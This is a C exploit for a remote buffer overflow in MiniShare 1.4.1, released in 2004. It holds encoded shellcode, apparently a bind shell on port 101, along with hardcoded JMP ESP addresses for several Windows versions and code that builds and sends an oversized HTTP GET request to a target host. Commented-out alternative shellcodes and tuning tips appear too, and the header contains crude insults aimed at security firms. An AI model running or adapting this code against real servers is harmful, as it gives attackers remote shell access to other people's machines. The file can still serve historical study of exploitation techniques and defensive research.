/*



MiniShare <= 1.4.1, Remote Buffer Overflow Exploit v0.1.
Bind a shellcode to the port 101.

Full disclosure and exploit 
by class101 [at] DFind.kd-team.com [&] #n3ws [at] EFnet
07 november 2004

Thanx to HDMoore and Metasploit.com for their kickass ASM work.


------------------
WHAT IS MINISHARE
------------------

Homepage - http://minishare.sourceforge.net/
	
	MiniShare is meant to serve anyone who has the need to share files to anyone,
	doesn't have a place to store the files on the web, 
    and does not want or simply does not have the skill
	and possibility to set up and maintain a complete HTTP-server software...

--------------
VULNERABILITY
--------------

	A simple buffer overflow in the link length, nothing more
	read the code for further instructions.

----
FIX
----

	Actually none, the vendor is contacted the same day published, 1 hour before you.
    As a nice fuck to NGSS , iDEFENSE and all others private disclosures
	homo crew ainsi que K-OTiK, ki se tap' des keu dans leur "Lab"
	lol :->

----
EXTRA
----
   
	Update the JMP ESP if you need. A wrong offset will crash minishare.
	Code tested working on MiniShare 1.4.1 and WinXP SP1 English, Win2k SP4 English, WinNT SP6 English
	Others MiniShare's versions aren't tested.
    Tip: If it crashes for you , try to play with Sleep()...

----
BY
----

    class101 [at] DFind.kd-team.com [&] #n3ws [at] EFnet
						 who
						greets
    DiabloHorn [at] www.kd-team.com [&] #kd-team [at] EFnet

*/



#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <sys/select.h>
#include <errno.h>
#include <netinet/in.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>



char scode[] =
"\xd9\xc3\xbe\xbd\x97\xc4\x93\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x54\x83\xc2\x04\x31\x72\x14\x03\x72\xa9\x75\x31\x6f\x39\xfb"
"\xba\x90\xb9\x9c\x33\x75\x88\x9c\x20\xfd\xba\x2c\x22\x53\x36"
"\xc6\x66\x40\xcd\xaa\xae\x67\x66\x00\x89\x46\x77\x39\xe9\xc9"
"\xfb\x40\x3e\x2a\xc2\x8a\x33\x2b\x03\xf6\xbe\x79\xdc\x7c\x6c"
"\x6e\x69\xc8\xad\x05\x21\xdc\xb5\xfa\xf1\xdf\x94\xac\x8a\xb9"
"\x36\x4e\x5f\xb2\x7e\x48\xbc\xff\xc9\xe3\x76\x8b\xcb\x25\x47"
"\x74\x67\x08\x68\x87\x79\x4c\x4e\x78\x0c\xa4\xad\x05\x17\x73"
"\xcc\xd1\x92\x60\x76\x91\x05\x4d\x87\x76\xd3\x06\x8b\x33\x97"
"\x41\x8f\xc2\x74\xfa\xab\x4f\x7b\x2d\x3a\x0b\x58\xe9\x67\xcf"
"\xc1\xa8\xcd\xbe\xfe\xab\xae\x1f\x5b\xa7\x42\x4b\xd6\xea\x0a"
"\xb8\xdb\x14\xca\xd6\x6c\x66\xf8\x79\xc7\xe0\xb0\xf2\xc1\xf7"
"\xb7\x28\xb5\x68\x46\xd3\xc6\xa1\x8c\x87\x96\xd9\x25\xa8\x7c"
"\x1a\xca\x7d\xe8\x1f\x5c\x74\xe6\x1f\x53\xe0\xfa\x1f\x6b\x8a"
"\x73\xf9\x3b\x3c\xd4\x56\xfb\xec\x94\x06\x93\xe6\x1a\x78\x83"
"\x08\xf1\x11\x29\xe7\xac\x4a\xc5\x9e\xf4\x01\x74\x5e\x23\x6c"
"\xb6\xd4\xc6\x90\x78\x1d\xa2\x82\x6c\x7c\x4c\x5b\x6c\x15\x4c"
"\x31\x68\xbf\x1b\xad\x72\xe6\x6c\x72\x8d\xcd\xee\x75\x71\x90"
"\xc6\x0e\x47\x06\x67\x79\xa7\xc6\x67\x79\xf1\x8c\x67\x11\xa5"
"\xf4\x3b\x04\xaa\x20\x28\x95\x3e\xcb\x19\x49\xe9\xa3\xa7\xb4"
"\xdd\x6b\x57\x93\x5e\x6b\xa7\x61\x42\xd4\xc0\x99\xc2\xe4\x10"
"\xf0\xc2\xb4\x78\x0f\xed\x3b\x49\xf0\x24\x14\xc1\x7b\xa8\xd6"
"\x70\x7b\xe1\xb7\x2c\x7c\x05\x6c\x38\xf3\xea\x93\x45\xf5\xd7"
"\x45\x7c\x83\x10\x56\x3b\x9c\x2b\xfb\x6a\x37\x53\xaf\x6d\x12";

/*

//116 bytes, execute regedit.exe, XORed 0x88, hardcoded WinXP SP1 English

char scode+[] =
"\xEB"
"\x0F\x58\x80\x30\x88\x40\x81\x38\x68\x61\x63\x6B\x75\xF4\xEB\x05\xE8\xEC\xFF\xFF"
"\xFF\xDD\x01\x6D\x09\x64\xC4\x88\x88\x88\xDB\x05\xF5\x3C\x4E\xCD\x7C\xFA\x4E\xCD"
"\x7D\xED\x4E\xCD\x7E\xEF\x4E\xCD\x7F\xED\x4E\xCD\x70\xEC\x4E\xCD\x71\xE1\x4E\xCD"
"\x72\xFC\x4E\xCD\x73\xA6\x4E\xCD\x74\xED\x4E\xCD\x75\xF0\x4E\xCD\x76\xED\x4E\xCD"
"\x77\x88\xE0\x8D\x88\x88\x88\x05\xCD\x7C\xD8\x30\xE8\x75\x6E\xFF\x77\x58\xE0\x89"
"\x88\x88\x88\x30\xEB\x10\x6F\xFF\x77\x58\x68\x61\x63\x6B\x90";

//565 bytes, execute regedit.exe, alphanumeric, hardcoded WinXP SP1 English

char scode+[]=
"LLLLYhbSgCX5bSgCHQVPPTQPPaRVVUSBRDJfh2ADTY09VQa0tkafhXMfXf1Dkbf1TkbjgY0Lkd0TkdfhH"
"CfYf1LkfjiY0Lkh0tkjjOX0Dkkf1TkljxY0Lko0Tko0TkqjfY0Lks0tks0Tkuj1Y0Lkw0tkw0tkyCjyY0"
"Lkz0TkzCC0tkzCCjmY0Lkz0TkzCC0TkzCCjhX0Dkz0tkzCC0tkzCCjPX0Dkz0TkzCC0tkzCCjfY0Lkz0T"
"kzCjjX0DkzC0TkzCCjeX0Dkz0tkzCC0TkzCCjvX0Dkz0tkzCC0TkzCCj3X0Dkz0tkzCC0tkzCCjOX0Dkz"
"0tkzCjaX0DkzCChuucTX1DkzCCCC0tkzCCjaY0Lkz0TkzCC0tkzCjRY0LkzCfhNUfXf1Dkzf1TkzCCCfh"
"hhfYf1Lkzf1TkzCCChS4ciX1DkzCCCC0TkzCC0tkzCjKY0Lkz0TkzCCfhzhfXf1Dkzf1TkzUvB3tLHCiS"
"r2K9Esr9Ele9E8g9Eqe9Ejd9Eni9EUt9EbD9Efe9Etx9E2e9EOahpucTrEjPG2LLwhGhR4ciGcgSwzG";

*/

static char payload[5000];

char espxp1en[]="\x33\x55\xdc\x77"; //JMP ESP - user32.dll   - WinXP SP1 English
char esp2k4en[]="\xb8\x9e\xe3\x77"; //JMP ESP - user32.dll   - Win2k SP4 English
char espnt6en[]="\xf8\x29\xf3\x77"; //JMP ESP - kernel32.dll - WinNT SP6 English
char espxp2fr[]="\x77\xd5\xaf\x0a"; //WinXP SP2 French
char espxp3fr[]="\x7C\x86\x46\x7B"; //JMP ESP - kernel32.dll - WinXP SP3 French

void usage(char* us);
void ver();

int main(int argc,char *argv[])
{
	ver();
	if ((argc<3)||(argc>4)||(atoi(argv[1])<1)){usage(argv[0]);return -1;}
	int ip=htonl(inet_addr(argv[2])), sz, port, sizeA, sizeB, sizeC, a, b, c;
	char *target, *os;
	if (argc==4){port=atoi(argv[3]);}
	else port=80;
	if (atoi(argv[1]) == 1){target=espxp1en;os="WinXP SP1 English";}
	if (atoi(argv[1]) == 2){target=esp2k4en;os="Win2k SP4 English";}
	if (atoi(argv[1]) == 3){target=espnt6en;os="WinNT SP6 English";}
	if (atoi(argv[1]) == 4){target=espxp2fr;os="WinXP SP2 French";}
	if (atoi(argv[1]) == 5){target=espxp3fr;os="WinXP SP3 French";}
	int s;
	fd_set mask;
	struct timeval timeout; 
	struct sockaddr_in server;
	s=socket(AF_INET,SOCK_STREAM,0);
	printf("[+] target: %s\n",os);			
	server.sin_family=AF_INET;
	server.sin_addr.s_addr=htonl(ip);
	server.sin_port=htons(port);
	connect(s,(struct sockaddr *)&server,sizeof(server));
	timeout.tv_sec=15;timeout.tv_usec=0;FD_ZERO(&mask);FD_SET(s,&mask);
	switch(select(s+1,NULL,&mask,NULL,&timeout))
	{
		case 0: {printf("[+] connection failed.\n");close(s);return -1;}
		default:
		if(FD_ISSET(s,&mask))
		{
			sleep(1);
			printf("[+] connected, constructing the payload...\n");
			sizeA=1787;
			sizeB=414-sizeof(scode);
			sizeC=10;
			sz=sizeA+sizeB+sizeC+sizeof(scode)+17;
			memset(payload,0,sizeof(payload));
			printf("[+] size of payload: %d\n",sz);
			strcat(payload,"GET ");
			for (a=0;a<sizeA;a++){strcat(payload,"\x41");}
			strcat(payload,target);
			for (b=0;b<sizeB;b++){strcat(payload,"\x41");}
			strcat(payload,scode);
			for (c=0;c<sizeC;c++){strcat(payload,"\x41");}
			strcat(payload," HTTP/1.1\r\n\r\n");
			sleep(1);
			if (send(s,payload,strlen(payload),0)<0) { printf("[+] sending error, the server probably rebooted.\n");return -1;}
			sleep(1);
			printf("[+] payload sent check your handler for a shell.\n");
			return 0;
		}
	}
	close(s);
	return 0;
}


void usage(char* us) 
{  
	printf("USAGE: 101_mini.exe Target Ip Port\n");
	printf("TARGETS:                               \n");
	printf("      [+] 1. WinXP SP1 English (*)\n");
	printf("      [+] 2. Win2k SP4 English (*)\n");
	printf("      [+] 3. WinNT SP6 English (*)\n");
	printf("      [+] 4. WinXP SP2 French  (*)\n");
	printf("      [+] 5. WinXP SP3 French  (*)\n");
	printf("NOTE:                               \n");
	printf("      The port 80 is default if no port specified\n");
	printf("      The exploit bind a shellcode to the port 101\n");
	printf("      A wildcard (*) mean Tested.\n");
	return;
} 

void ver()
{	
	printf("                                                                   \n");
	printf("        ===================================================[v0.1]====\n");
	printf("        ====MiniShare, Minimal HTTP Server for Windows <= v1.4.1=====\n"); 
	printf("        =============Remote Buffer Overflow Exploit==================\n");
	printf("        ====coded by class101===========[DFind.kd-team.com 2004]=====\n");
	printf("        =============================================================\n");
	printf("        =============================================================\n");
	printf("        =========ported and expanded by DR4WKC4B=====================\n");
	printf("        =============================================================\n");
	printf("                                                                   \n");
	return;
}

// milw0rm.com [2004-11-07]
